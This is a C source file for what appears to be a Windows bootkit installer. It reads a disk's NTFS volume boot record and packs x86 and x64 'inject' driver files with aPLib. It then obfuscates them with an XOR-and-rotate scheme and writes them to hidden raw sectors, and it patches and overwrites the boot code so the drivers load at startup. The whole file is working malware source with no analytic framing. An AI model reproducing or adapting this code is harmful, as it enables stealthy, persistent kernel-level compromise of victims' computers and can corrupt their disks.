#include "FlashDiskSector.h"

static ULONG __stdcall GetCodeOffset(PUCHAR pLoader)
{
	ULONG uli;

	uli = NTFS_LDR_HEADER_SIZE;

	// Skipping zeroes
	while (uli < BIOS_DEFAULT_SECTOR_SIZE/* && (pLoader[uli] == 0)*/)
	{
		if (pLoader[uli] == OP_JMP_SHORT)
		{
			uli += pLoader[uli + 1] + 2;
			break;
		}
		if (pLoader[uli] == OP_JMP_NEAR)
		{
			uli += *(PUSHORT)&pLoader[uli + 1] + 3;
			break;
		}
		uli += 1;
	}
	return uli;
}
ULONG __stdcall ApPack(PCHAR SrcBuffer,ULONG SrcLen,PCHAR* pDstBuffer)
{
	ULONG wLen,pLen,PackedLen = 0;
	PCHAR Packed = NULL,WorkSet = NULL;

	wLen = aP_workmem_size(SrcLen);
	pLen = aP_max_packed_size(SrcLen);

	do 
	{
		Packed = VirtualAlloc(NULL, \
			wLen + pLen, \
			MEM_COMMIT | MEM_RESERVE, \
			PAGE_READWRITE);
	} while (NULL == Packed);
	RtlZeroMemory(Packed,pLen);

	WorkSet = Packed + pLen;
	if (PackedLen = aP_pack(SrcBuffer,Packed,SrcLen,WorkSet,NULL,NULL))
	{
		*pDstBuffer = Packed;
	}
	else
	{
		VirtualFree(Packed,0,MEM_RELEASE);
	}
	return PackedLen;
}
BOOLEAN MakeLoader(PCHAR pBootLoader,\
				   ULONG ulBootSize, \
				   PCHAR pCompressDat, \
				   ULONG ulCompressSize, \
				   PCHAR *pPacked, \
				   ULONG *ulPackedSize, \
				   PCHSS pTargetChssAddr)
{
	BOOLEAN bRet;
	ULONG uli;
	//ULONG ulC;
	//USHORT XorValue;
	ULONG ulCount;

	bRet = FALSE;
	ulCount = 0;
	*pPacked = NULL;

	if (*ulPackedSize = ApPack(pCompressDat,ulCompressSize,pPacked))
	{
		if (ulBootSize)
		{
			for (uli = 0;uli < ulBootSize;uli++)
			{
				if (pBootLoader[uli] == (CHAR)BK_NAME_MAGIC && (*(PULONG)(&pBootLoader[uli]) == BK_NAME_MAGIC))
				{
					break;
				}
			}
			if (uli < ulBootSize)
			{
				//XorValue = *(PUSHORT)(&pOriginal[uli] + sizeof(ULONG));
				//pTargetChssAddr->ulXorValue = XorValue;

				memcpy(&pBootLoader[uli],pTargetChssAddr,sizeof(CHSS));		

				// Xoring file address and size structure
				//for (ulC = 0;ulC < (sizeof(CHSS) / 2);ulC++)
				//{
				//	*((PUSHORT)&pOriginal[uli] + ulC) ^= XorValue;
				//}
				bRet = TRUE;
			}
		}
		//VirtualFree(pPacked,0,MEM_RELEASE);
	}
	return bRet;
}
BOOLEAN GetFileDat(PCHAR pFileName,PCHAR* pDat,PULONG ulSize)
{
	BOOLEAN bRet;
	HANDLE hFile;
	ULONG ulRetBytesSize;
	LARGE_INTEGER lSize;

	bRet = FALSE;
	lSize.QuadPart = 0;

	do 
	{
		hFile = CreateFileA(pFileName, \
			FILE_READ_ACCESS, \
			FILE_SHARE_READ | FILE_SHARE_WRITE, \
			NULL, \
			OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, \
			NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			break;
		}
		bRet = GetFileSizeEx(hFile,&lSize);
		if (FALSE == bRet)
		{
			break;
		}
		*pDat = VirtualAlloc(NULL,lSize.LowPart,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
		if (NULL == *pDat)
		{
			break;
		}
		RtlZeroMemory(*pDat,lSize.LowPart);
		*ulSize = lSize.LowPart;
		bRet = ReadFile(hFile,*pDat,lSize.LowPart,&ulRetBytesSize,NULL);
		if (FALSE == bRet)
		{
			break;
		}
		bRet = TRUE;
	} while (0);
	if (hFile)
	{
		CloseHandle(hFile);
	}
	return bRet;
}
int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,int nCmdShow)
{
	HANDLE hDisk;
	HANDLE hVbr;
	PCHAR pVbrDat;
	PCHAR pBootCode;
	PCHAR pPacked;
	ULONG ulPackedSize;
	ULONG ulVbrSize;
	ULONG ulBootCodeSize;
	ULONG ulRetBytesSize;
	CHSS BkChss;
	CHSS NewChss;
	ULONG ulError;
	LDRDRV x86LdrDrv;
	LDRDRV x64LdrDrv;
	PCHAR pInjectX86Sys;
	PCHAR pInjectX64Sys;
	ULONG ulX86SysSize;
	ULONG ulX64SysSize;
	ULONG ulTotalSize;
	PCHAR pSysDat;
	ULONG ulSize;
	ULONG uli;
	ULONG ulXored;
	ULONG ulOffset;
	CHAR ShowMsgA[MAX_PATH];

	pVbrDat = NULL;
	pBootCode = NULL;
	ulVbrSize = 0;
	ulBootCodeSize = 0;
	ulRetBytesSize = 0;
	ulError = 0;
	pInjectX86Sys = NULL;
	pInjectX64Sys = NULL;
	ulX86SysSize = 0;
	ulX64SysSize = 0;
	ulTotalSize = 0;
	pSysDat = NULL;
	ulSize = 0;
	ulXored = 0;
	ulOffset = 0;
	pPacked = NULL;
	ulPackedSize = 0;
	RtlZeroMemory(ShowMsgA,sizeof(CHAR) * MAX_PATH);


	switch (__argc)
	{
	case 6:
		if (GetFileDat(__argv[4],&pInjectX86Sys,&ulX86SysSize) && \
			GetFileDat(__argv[5],&pInjectX64Sys,&ulX64SysSize))
		{
			ulTotalSize = sizeof(LDRDRV) * 3 + ulX86SysSize + ulX64SysSize;
			if (ulTotalSize % 0x200)
			{
				ulTotalSize = ((ulTotalSize / 0x200) + 1) * 0x200;
			}
			do 
			{
				pSysDat = VirtualAlloc(NULL,ulTotalSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
			} while (NULL == pSysDat);
			RtlZeroMemory(pSysDat,ulTotalSize);

			x86LdrDrv.ulSignature = 'XD86';
			x86LdrDrv.ulLength = ulX86SysSize;
			x86LdrDrv.ulOffset = sizeof(x86LdrDrv) * 3;
			x86LdrDrv.ulXor = 0;

			x64LdrDrv.ulSignature = 'XD64';
			x64LdrDrv.ulLength = ulX64SysSize;
			x64LdrDrv.ulOffset = sizeof(LDRDRV) * 3 + ulX86SysSize;
			x64LdrDrv.ulXor = 0;
			RtlCopyMemory(pSysDat,&x86LdrDrv,sizeof(LDRDRV));
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV)),&x64LdrDrv,sizeof(LDRDRV));
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3),pInjectX86Sys,ulX86SysSize);
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3 + ulX86SysSize),pInjectX64Sys,ulX64SysSize);

		}
		if (GetFileDat(__argv[2],&pBootCode,&ulBootCodeSize))
		{
			hVbr = CreateFileA(__argv[3], \
				FILE_ALL_ACCESS, \
				FILE_SHARE_READ, \
				NULL, \
				OPEN_EXISTING, \
				FILE_ATTRIBUTE_NORMAL, \
				NULL);
			if (INVALID_HANDLE_VALUE == hVbr)
			{
				return 0;
			}
			ulVbrSize = 0x2000;
			do 
			{
				pVbrDat = VirtualAlloc(NULL,ulVbrSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
			} while (NULL == pVbrDat);
			RtlZeroMemory(pVbrDat,ulVbrSize);
			if (FALSE == ReadFile(hVbr,pVbrDat,ulVbrSize,&ulRetBytesSize,NULL))
			{
				ulError = GetLastError();
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Read Vbr Failed.ErrorCode:%08x\r\r",ulError);
				OutputDebugStringA(ShowMsgA);
			}
			ulOffset = GetCodeOffset((PUCHAR)((ULONG)pVbrDat + BIOS_DEFAULT_SECTOR_SIZE));
			SetFilePointer(hVbr,ulOffset + BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
			RtlZeroMemory(&BkChss,sizeof(CHSS));
			BkChss.lStartSector.QuadPart = 0x0B;
			BkChss.uNumberSectors = (USHORT)(ulTotalSize / 0x400);
			BkChss.ulXorValue = GetTickCount();
			if (!MakeLoader(pBootCode, \
				ulBootCodeSize, \
				(PCHAR)((ULONG)pVbrDat + BIOS_DEFAULT_SECTOR_SIZE + ulOffset), \
				ulVbrSize - BIOS_DEFAULT_SECTOR_SIZE - ulOffset, \
				&pPacked, \
				&ulPackedSize, \
				&BkChss))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"MakeLoader() Failed.");
				OutputDebugStringA(ShowMsgA);
			}
			hDisk = CreateFileA(__argv[1], \
				FILE_ALL_ACCESS, \
				FILE_SHARE_READ, \
				NULL, \
				OPEN_EXISTING, \
				FILE_ATTRIBUTE_NORMAL, \
				NULL);
			if (INVALID_HANDLE_VALUE == hDisk)
			{
				return 0;
			}
			ulSize = ulTotalSize / sizeof(ULONG);
			for (uli = 0;uli < (ulTotalSize / sizeof(ULONG));uli++)
			{
				ulXored = ((PULONG)pSysDat)[uli];
				ulXored = _rotl((ulXored + ulSize) ^ BkChss.ulXorValue,ulSize);
				((PULONG)pSysDat)[uli] = ulXored;
				ulSize -= 1;
			}
			if (ulPackedSize % 0x200)
			{
				ulPackedSize = ((ulPackedSize / 0x200) + 1) * 0x200;
			}
			for (uli = 0;uli < ulBootCodeSize;uli++)
			{
				if (pBootCode[uli] == (CHAR)0x55 && (*(PULONG)(&pBootCode[uli]) == 0x55555555))
				{
					break;
				}
			}
			NewChss.lStartSector.QuadPart = BkChss.lStartSector.QuadPart + (BkChss.uNumberSectors * 0x400 / 0x200) + 1;
			NewChss.uNumberSectors = (USHORT)ulPackedSize/0x200;
			RtlCopyMemory(pBootCode + uli,&NewChss,sizeof(CHSS));

			SetFilePointer(hDisk,BkChss.lStartSector.LowPart * BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pSysDat,ulTotalSize,&ulRetBytesSize,NULL))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Write Sector Failed,Offset:%08x",BkChss.lStartSector.LowPart);
				OutputDebugStringA(ShowMsgA);
			}
			SetFilePointer(hDisk,NewChss.lStartSector.LowPart * BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pPacked,ulPackedSize,&ulRetBytesSize,NULL))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Write Sector Failed,Offset:%08x",NewChss.lStartSector.LowPart);
				OutputDebugStringA(ShowMsgA);
			}
			SetFilePointer(hDisk,0x800 * BIOS_DEFAULT_SECTOR_SIZE + BIOS_DEFAULT_SECTOR_SIZE + ulOffset,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pBootCode,ulBootCodeSize,&ulRetBytesSize,NULL))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Write Sector Failed,Offset:%08x",0x800 + 0x01);
				OutputDebugStringA(ShowMsgA);
			}
			if (hDisk)
			{
				CloseHandle(hDisk);
			}
			if (hVbr)
			{
				CloseHandle(hVbr);
			}
			if (pVbrDat)
			{
				VirtualFree(pVbrDat,ulVbrSize,MEM_RESERVE);
				pVbrDat = NULL;
			}
		}
		break;
	default:
		break;
	}
	return 0;
}